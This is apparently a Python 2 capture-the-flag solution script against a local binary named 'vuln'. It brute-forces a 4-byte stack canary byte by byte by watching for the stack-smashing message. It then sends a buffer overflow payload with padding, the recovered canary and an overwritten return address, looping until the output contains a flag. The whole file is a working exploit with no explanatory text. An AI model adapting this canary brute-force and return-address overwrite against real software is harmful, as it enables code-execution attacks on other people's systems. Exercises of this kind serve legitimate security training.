import subprocess as sp
def check_canary(size,can_val) :
        size = str(size)
        payload = size
        payload += "\n"
        payload +="A"*32
        payload += chr(canary[0]) +chr(canary[1]) +chr(canary[2]) +chr(canary[3])
        #print payload
        p=sp.Popen(['./vuln'],stdin=sp.PIPE,stdout=sp.PIPE)
        (out,err) = p.communicate(payload)
        return "Smashing Detected" not in out

canary =[0,0,0,0]
def get_canary():
        for i in xrange(4):
                for j in xrange(256):
                        canary [i] = j
                        if(check_canary(33+i,canary)):
                                print (chr(j))
                                break

def win ():

        payload = "56"
        payload += "\n"
        payload += "A"*32
        payload += "ex;Y"
        payload += "A"*16
        #payload += "\xed\x07\x00\x00" #0x565557ed , 0x00000007ed
        payload += "\xed\x57\x55\x56"
        p=sp.Popen(['./vuln'],stdin=sp.PIPE,stdout=sp.PIPE)
        (out,err) = p.communicate(payload)
        if ("CTF" in out):
                print out
                return True
        else:
                print out
                return False

#get_canary()
while (not win()):
        pass



